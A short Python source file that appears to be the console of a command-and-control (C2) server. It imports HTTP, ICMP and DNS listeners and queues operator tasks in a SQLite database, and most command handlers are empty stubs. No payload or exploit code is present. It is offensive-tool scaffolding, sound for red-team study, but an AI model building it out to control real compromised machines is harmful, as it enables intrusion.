import sqlite3
import sys
import threading

from task_manager import TaskManager
from http_listener import run_http
from icmp_listener import run_icmp
from dns_listener import run_dns

running = True #flag for global rounds

def add_task_command(task_manager, connection, command):
    pass

def list_task_command(connection):
    pass

def help_command():
    pass

def exit_command():
    print("[+] C2 is stopped.\n")
    global running
    running = False

def parse_and_execute(command, task_manager, connection):
    parse_command = command.split()
    
    if parse_command[0] == "add_task":
        if len(parse_command) == 1:
            print("The 'add_task' command requires at least one argument.\n"
                  "Example: add_task <command>")
        else:
            add_task_command(task_manager, connection, ' '.join(parse_command[1:]))
    elif parse_command[0] == "list_task":
        list_task_command(connection)
    elif parse_command[0] == "help":
        help_command()
    elif parse_command[0] == "exit":
        exit_command()
    else:
        print("[-] Command not found.\n")

def main():
    listeners = {} #хеш таблица для слушателей
    tm = TaskManager("c2_tasks.db") #экземпляр БД
    con_cli = tm.get_connection()

    print("[+] C2 is running.\n")

    try:
        #global rounds
        while running:
            command = input("C2> ")
            parse_and_execute(command, tm, con_cli)
    except KeyboardInterrupt:
        exit_command()

    con_cli.close()


if __name__ == "__main__":
    main()
